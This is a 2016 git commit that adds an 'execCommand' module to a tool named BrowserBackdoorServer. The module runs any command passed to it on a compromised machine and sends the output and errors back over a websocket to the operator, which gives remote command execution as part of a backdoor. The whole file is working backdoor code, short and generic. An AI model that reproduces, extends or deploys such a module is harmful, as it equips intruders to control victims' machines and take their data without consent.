f53b3673e1ca101b01924881bc635df425c462fa
IMcPwn <imcpwn@protonmail.com>
2016-06-11 13:06:54 -0400

    Add execCommand module

---
+++ server/modules/execCommand.js
@@ -0,0 +1,23 @@
+// INTERACTIVE
+/*
+ * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
+ * BrowserBackdoorServer by IMcPwn.
+ * See the file 'LICENSE' for copying permission
+ *
+ * Info: Executes a command
+ * Parameters: command
+ * Returns: undefined, error, stdout, stderr
+ * Author: IMcPwn
+ */
+
+exec = require('child_process').exec;
+
+execCommand = function (cmd) {
+    exec(cmd, function (err, stdout, stderr) {
+        if (err) ws.send(err);
+        ws.send('stdout: ' + stdout);
+        ws.send('stderr: ' + stderr);
+    });
+}
+
+return "\nUsage: execCommand(cmd)\n- cmd is the command to be executed.";
